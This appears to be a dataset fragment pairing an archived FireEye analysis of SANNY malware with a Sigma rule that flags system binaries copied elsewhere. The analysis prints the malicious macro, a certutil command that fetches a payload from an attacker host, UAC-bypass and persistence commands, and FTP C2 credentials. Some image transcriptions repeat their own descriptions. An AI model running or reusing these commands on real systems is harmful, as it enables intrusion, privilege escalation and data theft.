humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab > nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "Suspicious Copy From or To System Directory",
      "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
      "related": [
        {
          "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-07-03",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "target": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "condition": "1 of selection_* and target"
      },
      "falsepositives": [
        "Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)",
        "When cmd.exe and xcopy.exe are called directly",
        "When the command contains the keywords but not in the correct order"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir.yml",
    "id": "520"
  },
  {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command 